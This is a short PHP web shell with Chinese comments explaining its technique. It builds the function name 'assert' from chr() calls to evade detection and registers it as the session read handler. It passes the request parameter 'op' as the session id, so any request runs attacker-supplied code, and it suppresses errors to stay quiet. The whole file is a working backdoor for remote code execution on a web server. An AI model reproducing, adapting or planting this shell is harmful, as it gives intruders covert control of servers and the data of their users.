<?php
    error_reporting(0); 
    $session = chr(97) . chr(115) . chr(115) . chr(101) . chr(114) . chr(116); //assert
    // open第一个被调用，类似类的构造函数
    function open($save_path, $session_name) 
    {}
    // close最后一个被调用，类似 类的析构函数
    function close() 
    {
    }
    // 执行session_id($_REQUEST['op'])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST['op'])
    session_id($_REQUEST['op']);
    function write($id, $sess_data) 
    {}
    function destroy($id) 
    {}
    function gc() 
    {}
    // 第三个参数为read  read(string $sessionId)
    session_set_save_handler("open", "close", $session, "write", "destroy", "gc");
    @session_start(); // 打开会话
    $cloud = $_SESSION["d"] = "c";  
?>